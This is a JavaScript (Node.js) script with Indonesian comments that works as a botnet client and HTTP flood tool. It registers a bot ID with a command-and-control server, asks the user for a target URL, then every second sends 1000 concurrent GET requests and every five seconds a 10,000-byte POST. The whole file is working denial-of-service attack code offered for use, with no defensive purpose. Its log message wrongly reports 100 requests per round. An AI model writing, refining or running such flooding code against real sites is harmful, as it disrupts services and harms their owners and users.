const axios = require('axios');
const readline = require('readline');

// Setup readline untuk input user
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Generate random bot ID
const botId = `bot-${Math.random().toString(36).substr(2, 9)}`;

// Fungsi untuk register bot ke server C&C
async function registerBot() {
  try {
    await axios.post('http://localhost:8080', null, {
      params: { botId }
    });
    console.log(`Bot ${botId} registered.`);
  } catch (error) {
    console.error(`Failed to register bot ${botId}`);
  }
}

// Fungsi untuk mengirim request GET ke target (100x dalam sekali jalan)
async function attack(target) {
  try {
    const requests = [];
    for (let i = 0; i < 1000; i++) {
      requests.push(axios.get(target));
    }
    await Promise.all(requests);
    console.log(`Bot ${botId} sent 100 GET requests to ${target}`);
  } catch (error) {
    console.error(`Bot ${botId} failed to send GET requests.`);
  }
}

// Fungsi untuk mengirim request POST ke target setiap 5 detik
async function sendPostRequest(target) {
  setInterval(async () => {
    try {
      await axios.post(target, "data=" + "A".repeat(10000), {
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
      });
      console.log(`Bot ${botId} sent POST request to ${target}`);
    } catch (error) {
      console.error(`Bot ${botId} failed to send POST request.`);
    }
  }, 5000);
}

// Fungsi untuk meminta input URL dari pengguna
function getTargetURL() {
  rl.question('Masukkan URL target (misal: http://example.com): ', (target) => {
    if (target.startsWith('http://') || target.startsWith('https://')) {
      console.log(`Target URL: ${target}`);
      registerBot();
      
      // Jalankan serangan setiap 1 detik
      setInterval(() => {
        attack(target);
        console.log(`Bot ${botId} is attacking... (Jeda 1 detik)`);
      }, 1000);

      // Kirim POST request setiap 5 detik
      sendPostRequest(target);
      
    } else {
      console.log('URL tidak valid. Pastikan diawali dengan http:// atau https://');
      getTargetURL();
    }
  });
}

// Mulai meminta input URL
getTargetURL();
